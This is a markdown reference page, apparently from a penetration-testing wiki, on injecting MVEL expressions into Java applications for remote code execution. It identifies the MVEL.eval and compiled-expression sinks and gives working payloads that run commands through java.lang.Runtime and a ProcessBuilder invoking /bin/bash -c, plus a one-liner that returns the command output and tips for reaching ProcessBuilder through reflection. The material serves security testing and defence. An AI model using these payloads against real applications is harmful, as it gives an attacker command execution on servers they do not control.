---
title: "MVEL injection: expression language code execution on the JVM"
description: "MVEL evaluates Java-like expressions with direct access to Java types, so an attacker-influenced expression passed to MVEL.eval or a compiled expression reaches Runtime and ProcessBuilder for code execution."
keywords:
  - MVEL injection
  - MVEL.eval
  - MVEL expression language
  - Java expression injection
  - ProcessBuilder RCE
---

# MVEL

MVEL (MVFLEX Expression Language) is a runtime expression language for the JVM used as the scripting layer in several frameworks and rule systems: it backs Drools rule actions, appears in Spring and Camel routing predicates, and is embedded directly wherever an application wants a lightweight formula engine. Unlike the sandboxed EL dialects, MVEL is Java-like by design and resolves type references directly, so there is no restriction to walk around before reaching the runtime.

## Evaluation entry point

The sink is a call that compiles and evaluates an expression string. The one-shot form is `MVEL.eval(String)`, and the reusable form compiles once with `MVEL.compileExpression(String)` and runs the result through `MVEL.executeExpression(compiled, context)`. When the string handed to either call carries request data, the expression grammar is attacker-controlled:

```java
// expr taken from the request
Object result = MVEL.eval(expr);
```

## Code execution

MVEL reads fully qualified Java types and calls their static methods, so `java.lang.Runtime` is reachable with no preamble. Use the fully qualified name: stock MVEL does not auto-import `java.lang` (unlike Java source, and unlike Drools which adds default imports), so a bare `Runtime` fails to resolve on a default parser context. `Runtime.exec(String)` tokenizes the command on whitespace and runs it with no shell, so it suits a single program with simple arguments:

```java
java.lang.Runtime.getRuntime().exec("id")
```

Because `exec(String)` has no shell, pipes, `$(...)`, redirection, and `;` separators do not work. For anything needing shell features, construct a `ProcessBuilder` with an explicit argument array where the shell is the program and the chained command is a single element:

```java
new java.lang.ProcessBuilder(new String[]{"/bin/bash","-c","id; uname -a"}).start()
```

MVEL can also create objects and invoke instance methods, so the output is readable in the same expression by draining the process stream:

```java
new java.util.Scanner(new java.lang.ProcessBuilder(new String[]{"/bin/bash","-c","id"}).start().getInputStream()).useDelimiter("\\A").next()
```

MVEL accepts the leading-`@` import syntax as well, and unqualified class names resolve when the type is already imported into the parser context, which shortens payloads when the application preloads common packages. Where only a property navigation is evaluated rather than a full statement, the same reflection route used by the unified EL dialects applies: reach `getClass().forName(...)` from any in-scope object and build the `ProcessBuilder` through its declared constructors.

## References

- [MVEL Language Guide](http://mvel.documentnode.com/)
- [PayloadsAllTheThings: Java EL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Java)
